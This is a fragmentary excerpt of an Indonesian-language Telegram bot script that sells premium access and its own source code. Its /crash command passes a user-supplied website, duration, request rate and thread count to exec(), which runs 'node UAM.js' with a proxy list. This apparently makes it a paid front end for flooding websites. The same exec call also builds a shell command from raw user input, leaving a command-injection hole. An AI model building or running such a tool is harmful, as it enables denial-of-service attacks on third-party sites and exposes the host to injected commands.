...
bot.onText(/\/addprem (.+)/, (msg, match) => {
  ...
  if (isAdmin(msg.from.id)) {
    ...
    bot.sendMessage(msg.chat.id, `User ${userId} sudah menjadi premium bang Dapzz.`);
  } else {
...
bot.onText(/\/delprem (.+)/, (msg, match) => {
  ...
  if (isAdmin(msg.from.id)) {
    ...
    bot.sendMessage(msg.chat.id, `User ${userId} kasian di non premium ama bang Dapzz.`);
  } else {
  ...
  bot.sendMessage(chatId, "🤖 *BERIKUT MENU BOT* 🤖\n\n" +
    ...
    "🔥 *BERIKUT MENU KAMI, MAU BELI SC BOT TEKAN BUTTON DIBAWAH* 🔥",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🛒 BELI SC BOT 🛒', url: 'https://t.me/dycoders' }
          ]
        ]
      },
      parse_mode: "Markdown"
...
bot.onText(/\/myprem/, (msg) => {
    try {
        ...
        if (premiumUsers.has(msg.from.id.toString())) {
            ...
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @Solouser1 untuk informasi lebih lanjut. 💼💰\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 🎊🙌\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
...
const donasiData = {
    pesan: 'BOT BERHASIL NYALA YA COK \ud83e\udd17'
};
...
try {
  ...
  bot.onText(/\/crash (.+) (.+) (.+) (.+)/, (msg, match) => {
    ...
    if (isPremiumUser(userId)) {
      ...
      exec(`node UAM.js ${web} ${time} ${req} ${thread} proxy6.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
